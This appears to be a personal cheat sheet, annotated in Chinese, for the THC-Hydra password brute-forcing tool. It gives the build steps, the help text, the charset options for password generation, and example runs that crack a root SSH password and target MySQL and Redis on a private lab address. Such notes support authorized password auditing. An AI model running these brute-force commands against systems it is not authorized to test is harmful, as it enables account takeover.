# [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

```bash
yum -y install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel

wget https://github.com/vanhauser-thc/thc-hydra/archive/v9.1.tar.gz
./configure
make -j4
make install
```

```bash
hydra -h
Syntax: hydra [service://server[:PORT][/OPT]]
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh

# 生成密码
`-x MIN:MAX:CHARSET`, `charset` 位置，使用 `a` 表示小写字母，`A` 表示大写字母，`1` 表示数字
Examples:
   -x 3:5:a  generate passwords from length 3 to 5 with all lowercase letters
   -x 5:8:A1 generate passwords from length 5 to 8 with uppercase and numbers
   -x 1:3:/  generate passwords from length 1 to 3 containing only slashes
   -x 5:5:/%,.-  generate passwords with length 5 which consists only of /%,.-
   -x 3:5:aA1 -y generate passwords from length 3 to 5 with a, A and 1 only
```

```bash
# 破解ssh的密码
hydra -l root -P testPass.txt -t 6 ssh://192.168.137.129 -V -f
[STATUS] attack finished for 192.168.137.129 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

hydra -l root -P testPass.txt mysql://192.168.137.129

hydra -P password.txt redis://192.168.137.129

[DATA] attacking redis://192.168.137.129:6379/
[!] The server 192.168.137.129 does not require password.
```
